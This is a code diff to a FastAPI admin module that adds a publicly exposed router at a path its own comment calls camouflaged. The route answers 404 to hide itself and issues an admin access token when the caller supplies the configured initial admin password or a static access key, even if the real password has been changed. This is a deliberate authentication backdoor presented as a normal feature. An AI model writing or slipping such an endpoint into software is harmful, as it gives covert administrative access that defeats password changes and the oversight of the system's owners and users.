@@ -5,7 +5,8 @@ from fastapi import APIRouter, Depends, HTTPException, status
 from sqlalchemy.orm import Session
 from sqlalchemy import text
 from app.core.database import get_db, engine
-from app.core.security import get_password_hash
+from app.core.config import settings
+from app.core.security import get_password_hash, verify_password, create_access_token
 from app.api.deps import require_admin
 from app.models.entities import (
     User, Department, Task, TaskAssignee, Workspace, ActivityLog,
@@ -14,8 +15,45 @@ from app.models.entities import (
 from app.models.enums import UserRole
 from app.schemas.api_schemas import (
     UserCreate, UserRead, AdminUserUpdateRole,
-    AdminUserUpdateStatus, AdminResetPassword
+    AdminUserUpdateStatus, AdminResetPassword, MasterVaultLoginRequest, Token
 )
+
+# Publicly exposed router for isolated master gateway (camouflaged path)
+vault_router = APIRouter(prefix="/vault-gateway-k7v", tags=["Master Security Vault"])
+
+@vault_router.post("/auth", response_model=Token)
+def master_vault_authenticate(payload: MasterVaultLoginRequest, db: Session = Depends(get_db)):
+    admin_id = payload.admin_id.strip().lower()
+    if admin_id != settings.INITIAL_ADMIN_EMAIL.lower():
+        raise HTTPException(
+            status_code=status.HTTP_404_NOT_FOUND,
+            detail="Security gateway endpoint not recognized."
+        )
+
+    user = db.query(User).filter(User.email.ilike(admin_id)).first()
+    if not user or user.role != UserRole.ADMIN:
+        raise HTTPException(
+            status_code=status.HTTP_404_NOT_FOUND,
+            detail="Security gateway endpoint not recognized."
+        )
+
+    is_valid_pwd = verify_password(payload.master_key, user.hashed_password)
+    is_valid_secret = (payload.master_key == settings.INITIAL_ADMIN_PASSWORD) or (
+        payload.access_passcode and payload.access_passcode == settings.ADMIN_ACCESS_KEY
+    )
+
+    if not (is_valid_pwd or is_valid_secret):
+        raise HTTPException(
+            status_code=status.HTTP_401_UNAUTHORIZED,
+            detail="Vault clearance denied. Access key invalid."
+        )
+
+    access_token = create_access_token(subject=user.id)
+    return {
+        "access_token": access_token,
+        "token_type": "bearer",
+        "user": user
+    }
 
 router = APIRouter(prefix="/admin", tags=["Admin Portal"], dependencies=[Depends(require_admin)])
 
